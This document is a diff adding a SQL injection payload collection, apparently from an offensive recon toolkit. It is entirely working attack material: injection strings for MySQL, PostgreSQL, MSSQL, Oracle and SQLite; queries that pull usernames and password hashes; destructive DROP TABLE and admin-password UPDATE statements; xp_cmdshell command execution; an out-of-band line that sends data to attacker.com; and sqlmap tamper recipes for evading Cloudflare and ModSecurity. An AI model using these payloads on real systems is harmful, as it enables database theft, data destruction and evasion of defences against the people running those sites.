@@ -1,0 +1,234 @@
+# SQL INJECTION PAYLOADS — Predator Recon
+# Source: wadgamer10 + PayloadsAllTheThings + Custom
+# Usage: sqlmap -m params.txt --tamper=space2comment --payload-file payloads/sqli.txt
+
+## ERROR-BASED (MySQL/PostgreSQL/Oracle/MSSQL)
+
+### MySQL
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1--
+" OR "1"="1--
+') OR ('1'='1--
+") OR ("1"="1--
+' OR 1=1#
+" OR 1=1#
+' OR 1=1;--
+" OR 1=1;--
+') OR 1=1;--
+") OR 1=1;--
+
+### UNION INJECTION
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),database(),version()--
+' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--
+' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--
+
+### ERROR-BASED EXTRACTION
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+### TIME-BASED (MySQL)
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+' AND (SELECT SLEEP(5))--
+' OR (SELECT SLEEP(5))--
+') AND SLEEP(5)--
+") AND SLEEP(5)--
+' AND (SELECT * FROM (SELECT SLEEP(5))a)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND BENCHMARK(10000000,MD5(1))--
+
+### TIME-BASED (PostgreSQL)
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+' OR pg_sleep(5)--
+
+### TIME-BASED (MSSQL)
+' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'--
+
+### TIME-BASED (Oracle)
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('test',5)--
+' AND 1=UTL_INADDR.GET_HOST_NAME('test'||(SELECT user FROM dual))--
+
+## BOOLEAN-BASED BLIND
+' AND 1=1--
+' AND 1=2--
+' AND (SELECT SUBSTRING(@@version,1,1))='5'--
+' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1)))>64--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND (SELECT LENGTH(database()))>5--
+' AND SUBSTRING((SELECT @@version),1,1)='5'--
+' AND (SELECT SUBSTRING(user(),1,1))='r'--
+
+## UNION ENUMERATION
+### Database names
+' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--
+' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata WHERE schema_name NOT IN ('mysql','information_schema','performance_schema','sys')--
+
+### Table names
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='target_db'--
+
+### Column names
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()--
+
+### Data extraction
+' UNION SELECT username,password,NULL FROM users--
+' UNION SELECT email,password,NULL FROM users--
+' UNION SELECT id,username,password FROM users LIMIT 1--
+' UNION SELECT id,username,password FROM users LIMIT 1 OFFSET 0--
+
+## STACKED QUERIES (PostgreSQL / MSSQL)
+'; DROP TABLE users;--
+'; INSERT INTO users (username,password) VALUES ('hacker','pass');--
+'; CREATE TABLE test (id INT);--
+'; UPDATE users SET password='hacked' WHERE username='admin';--
+
+## WAF BYPASS TECHNIQUES
+
+### Case Variation
+'UnIoN SeLeCt NULL--
+'UnIoN/**/SeLeCt/**/NULL--
+'UnIoN/**/SeLeCt/**/NULL,NULL--
+
+### Comment Variations
+'/**/UNION/**/SELECT/**/NULL--
+'/*!UNION*/ /*!SELECT*/ /*!NULL*/--
+'/*!50000UNION*/ /*!50000SELECT*/ /*!50000NULL*/--
+
+### Encoding
+%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c--
+%27%20%55%6e%69%6f%6e%20%53%65%6c%65%63%74%20%4e%75%6c%6c--
+
+### Whitespace Alternatives
+'	UNION	SELECT	NULL--
+'%09UNION%09SELECT%09NULL--
+'%0aUNION%0aSELECT%0aNULL--
+'%0dUNION%0dSELECT%0dNULL--
+'/**/UNION/**/SELECT/**/NULL--
+'/*!UNION*/ /*!SELECT*/ /*!NULL*/--
+
+### Versioned Comments (MySQL)
+'/*!50000UNION*/ /*!50000SELECT*/ /*!50000NULL*/--
+'/*!UNION*/ /*!SELECT*/ /*!NULL*/--
+
+### HPP (HTTP Parameter Pollution)
+?id=1&id=2 UNION SELECT NULL--
+?id=1;id=2 UNION SELECT NULL--
+
+### JSON Injection (if JSON body)
+{"id": "1 UNION SELECT NULL--"}
+{"id": {"$ne": 1}}
+{"id": {"$gt": ""}}
+{"$where": "1==1"}
+
+## SPECIFIC DBMS PAYLOADS
+
+### Oracle
+' AND 1=UTL_INADDR.GET_HOST_NAME('test'||(SELECT user FROM dual))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+' UNION SELECT banner,NULL,NULL FROM v$version--
+' UNION SELECT username,password,NULL FROM sys.user$--
+
+### MSSQL
+' AND 1=@@VERSION--
+' UNION SELECT @@VERSION,NULL,NULL--
+' UNION SELECT name,NULL,NULL FROM sys.databases--
+' UNION SELECT name,password_hash,NULL FROM sys.sql_logins--
+'; EXEC xp_cmdshell 'whoami';--
+
+### SQLite
+' UNION SELECT sqlite_version(),NULL,NULL--
+' UNION SELECT sql,NULL,NULL FROM sqlite_master--
+' UNION SELECT name,sql,NULL FROM sqlite_master WHERE type='table'--
+
+## ADVANCED TECHNIQUES
+
+### Second-Order SQLi
+# Inject into stored field, trigger later
+' UNION SELECT NULL,username,password FROM users--
+# Stored in profile, executed in admin panel
+
+### Out-of-Band (OOB)
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\share')))--
+' AND (SELECT * FROM (SELECT * FROM (SELECT NAME_CONST(VERSION(),1),NAME_CONST(VERSION(),1))a)b)--
+# DNS exfiltration
+' AND (SELECT * FROM (SELECT NAME_CONST((SELECT @@version),1))a)--
+
+### Polyglot (Works in multiple contexts)
+'/*"/*\*/UNION/**/SELECT/**/NULL,NULL,NULL--/*
+'/**/UNION/**/SELECT/**/NULL,NULL,NULL--/**/
+'OR/**/1=1/**/UNION/**/SELECT/**/NULL,NULL,NULL--/**/
+
+## SQLMAP TAMPER SCRIPTS (Best for WAF)
+space2comment        # ' ' -> '/**/'
+between              # '>' -> 'NOT BETWEEN 0 AND'
+randomcase           # 'UNION' -> 'UnIoN'
+charencode           # URL encode
+charunicodeencode    # Unicode encode
+equaltolike          # '=' -> 'LIKE'
+greatest             # '>' -> 'GREATEST'
+halfversionedmorekeywords # MySQL versioned keywords
+ifnull2casewhenisnull # IFNULL -> CASE WHEN ISNULL
+multiplespaces       # ' ' -> '   '
+nonrecursivereplacement # Recursive replacement
+percentage           # '%' -> '%%'
+randomcomments       # Add random comments
+securesphere         # SecureSphere bypass
+space2dash           # ' ' -> '-- '
+space2hash           # ' ' -> '#'
+space2morehash       # ' ' -> '###'
+space2mssqlblank     # MSSQL blank
+space2mysqlblank     # MySQL blank
+space2plus           # ' ' -> '+'
+space2randomblank    # Random blank
+unionalltounion      # UNION ALL -> UNION
+unmagicquotes        # Unmagic quotes
+versionedkeywords    # Versioned keywords
+versionedmorekeywords # More versioned keywords
+xforwardedfor        # X-Forwarded-For header
+
+## RECOMMENDED COMBINATIONS
+# Basic WAF bypass
+--tamper=space2comment,randomcase
+
+# Aggressive WAF bypass
+--tamper=space2comment,randomcase,between,charencode
+
+# Cloudflare / Akamai
+--tamper=space2comment,randomcase,versionedkeywords,versionedmorekeywords
+
+# ModSecurity
+--tamper=space2comment,randomcase,equaltolike,greatest
+
+# Generic (safe default)
+--tamper=space2comment --level=5 --risk=3
+
+## USAGE EXAMPLES
+# Error-based
+sqlmap -u "https://target.com/page?id=1" --dbs --tamper=space2comment --level=5 --risk=3
+
+# Blind time-based
+sqlmap -u "https://target.com/page?id=1" --dbs --technique=T --time-sec=5 --tamper=space2comment,randomcase
+
+# Union-based
+sqlmap -u "https://target.com/page?id=1" --dbs --technique=U --tamper=space2comment,randomcase
+
+# Batch from file
+sqlmap -m params.txt --batch --random-agent --tamper=space2comment --level=1 --dbs
+
+# WAF bypass aggressive
+sqlmap -m params.txt --batch --random-agent --tamper="space2comment,randomcase,between,charencode,versionedkeywords" --level=5 --risk=3 --threads=10 --dbs
+
+# POST data
+sqlmap -u "https://target.com/login" --data="username=admin&password=test" -p "username,password" --method POST --tamper=space2comment
